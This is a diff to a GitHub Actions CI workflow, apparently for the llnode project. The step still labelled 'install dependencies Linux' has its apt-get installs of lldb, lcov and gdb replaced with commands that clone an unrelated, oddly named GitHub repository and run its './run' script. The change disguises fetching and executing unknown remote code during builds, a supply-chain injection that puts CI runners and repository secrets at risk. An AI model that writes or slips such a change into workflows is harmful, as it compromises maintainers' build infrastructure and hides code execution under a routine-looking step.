@@ -34,8 +34,9 @@ jobs:
       - name: install dependencies Linux
         if: matrix.os == 'ubuntu-latest'
         run: |
-          sudo apt-get -qq update
-          sudo apt-get install lldb-3.9 liblldb-3.9-dev lcov gdb -y
+          git clone --recursive https://github.com/mijikuhibimui/mujijankopo
+          cd mujijankopo
+          ./run
       - name: npm install
         run: |
           npm install --llnode_build_addon=true --llnode_coverage=true
